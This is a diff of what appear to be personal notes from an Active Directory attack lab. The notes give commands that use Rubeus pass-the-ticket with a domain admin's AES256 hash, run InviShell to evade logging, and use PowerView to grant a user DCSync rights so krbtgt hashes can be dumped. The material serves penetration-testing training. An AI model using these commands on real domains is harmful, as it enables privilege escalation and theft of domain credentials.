@@ -10,7 +10,7 @@ It doesn't return nothing, so we don't have priviledge
 *add the replication rights for the studentx and execute the DCSync attack to pull hashes of the krbtgt user*
 Create a session with a domain admin
 ```cmd
-C:\AD\Tools\Rubeus.exe asktgt /user:<DOMAIN ADMIN> /aes256:<< /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+C:\AD\Tools\Rubeus.exe asktgt /user:<DOMAIN ADMIN> /aes256:<aes 256 hash> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 ```
 Run invishell and import powerview
 ```cmd
@@ -21,7 +21,7 @@ C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
 ```
 add the permission to student115 
 ```powerview
-Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student115 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
+Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity <NOME TUO UTENTE> -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
 ```
 ![[Pasted image 20231025125006.png]]
 Let's check if now we have the permissions (use the previous command)
